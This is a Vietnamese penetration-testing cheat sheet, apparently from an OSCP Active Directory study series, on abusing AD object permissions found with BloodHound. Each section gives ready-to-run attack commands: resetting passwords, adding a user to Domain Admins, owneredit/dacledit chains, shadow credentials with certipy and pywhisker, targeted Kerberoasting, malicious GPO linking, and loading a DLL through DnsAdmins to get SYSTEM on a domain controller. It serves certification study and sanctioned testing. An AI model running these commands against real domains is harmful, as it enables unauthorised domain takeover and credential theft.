# 09 — ACLs / ACEs permissions (lạm dụng quyền trên object)

**Trạng thái:** có creds; BloodHound chỉ ra một **cạnh ACL** từ user của bạn tới
object khác. **Mục tiêu:** biến quyền đó thành kiểm soát user/nhóm/máy/GPO → leo
thang. Nhánh "ACLs/ACEs permissions" của mindmap.

> Impacket ACL: dùng như với creds nhưng thay bằng `-hashes ':<hash>'` nếu chỉ có hash.
> NetExec: thay bằng `-H ':<hash>'`.

---

## A. ForceChangePassword (trên User)

> **Khi nào:** có edge ForceChangePassword / GenericAll trên user.

```powershell
net user <user> <password> /domain          # đổi mật khẩu (box "Change password")
```

- **Kết quả:** box **"User with clear text pass"** → đăng nhập bằng user đó.
- Ưu tiên shadow credentials nếu không muốn phá mật khẩu (xem §E).

## B. Add member to group (GenericAll/GenericWrite/Self/AddMember trên Group)

> **Khi nào:** có quyền trên object nhóm (box "On Group").

```powershell
net group "domain admins" myuser /add /domain       # ví dụ thêm vào DA
```

- **Kết quả:** box **"ADD DA"** → thuộc nhóm đặc quyền (nhớ lấy token mới).

## C. WriteOwner / WriteDACL (trên bất kỳ object)

> **Khi nào:** edge WriteOwner hoặc WriteDacl.
> **Tại sao:** WriteOwner → tự làm owner → WriteDacl → tự cấp GenericAll. Mindmap:
> "Write Owner → Grant Ownership" và "WriteDACL + WriteOwner → Grant rights →
> Give yourself generic all".

```bash
# dùng impacket dacledit/owneredit hoặc bloodyAD (xem OSCP-AD/04 để lệnh đầy đủ)
owneredit.py -action write -new-owner <you> -target <obj> <domain>/<user>:<pass>
dacledit.py -action write -rights FullControl -principal <you> -target <obj> <domain>/<user>:<pass>
```

- **Kết quả:** GenericAll trên object → tiếp tục A/B/E tuỳ loại object.

## D. ACE Inheritance / Write Dacl lan truyền

> **Khi nào:** có WriteDacl trên container/OU → ACE thừa kế xuống con.

```
Write Dacl → ACE Inheritance → Grant rights (lan xuống object con)
```

## E. Shadow Credentials (GenericWrite/AddKeyCredentialLink trên User/Computer)

> **Khi nào:** ghi được `msDS-KeyCredentialLink` (box "add key credentials / add
> Key Credentials") + có PKINIT.

```bash
certipy shadow auto -username <you>@<domain> -p <password> -account '<target>'
pywhisker.py -d "FQDN" -u "you" -p "pass" --target "TARGET_SAMNAME" --action "add"
```

- **Kết quả:** NT hash + TGT của target → Pass the hash/cert ([file 06](06-adcs.md)).
- **GenericWrite trên Computer** cũng mở đường **RBCD** ([file 05](05-kerberos-delegation.md)).

## F. Targeted Kerberoast (GenericWrite/WriteSPN trên User)

```bash
targetedKerberoast.py -d <domain> -u <user> -p <pass>      # add SPN → roast → xoá
```

- **Kết quả:** box **"Hash found (TGS)"** → crack `-m 13100`.

## G. Extended Rights

> **Khi nào:** edge AllExtendedRights trên user/domain → gồm ForceChangePassword,
> DS-Replication (DCSync), đọc LAPS.

- DCSync right trên domain → [file 12](12-domain-admin-persistence.md).

## H. On Computer (GenericAll/GenericWrite)

- → RBCD hoặc Shadow credentials (máy) → Admin trên máy đó.
  ```bash
  nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>   # sau khi kiểm soát máy
  ```

## I. On OU (Manage Group Policy Links)

> **Khi nào:** GenericAll/GenericWrite/Manage GP Links trên OU.

```bash
OUned.py --config config.ini          # lạm dụng GP-Link trên OU để áp GPO độc
```

```powershell
# Tìm ai ghi được GP-Link trên OU (box mindmap)
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

## J. GPO abuse (Generic Write on GPO)

> **Khi nào:** ghi được GPO (box "Who can control GPOs", "Abuse GPO").

```cypher
MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p         # ai điều khiển GPO
```

```powershell
# Ai tạo được GPO mới trong domain
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
# Lạm dụng: SharpGPOAbuse / pygpoabuse (thêm scheduled task / local admin) — xem OSCP-AD/04
```

- **Kết quả:** chạy lệnh/thêm local admin trên mọi máy áp GPO → Admin/DA.

## K. DNSAdmins abuse (CVE-2021-40469)

> **Khi nào:** thuộc nhóm **DnsAdmins** (box "DNS Admin").
> **Tại sao:** nạp DLL tuỳ ý vào dịch vụ DNS (chạy SYSTEM trên DC).

```powershell
dnscmd.exe /config /serverlevelplugindll <\\path\to\dll>     # cần user dnsadmin
sc \\DNSServer stop dns ; sc \\DNSServer start dns           # restart để nạp DLL
```

- **Kết quả:** box **"Admin"** (SYSTEM trên DC).

---

## Checklist ACL/ACE

- [ ] BloodHound: Outbound Object Control của user
- [ ] User → ForceChangePassword / shadow cred / targeted kerberoast
- [ ] Group → add member
- [ ] WriteOwner→WriteDacl→GenericAll chain
- [ ] Computer → RBCD / shadow cred
- [ ] OU/GPO → OUned / SharpGPOAbuse
- [ ] DnsAdmins → DLL → SYSTEM trên DC
- [ ] AllExtendedRights trên domain → DCSync
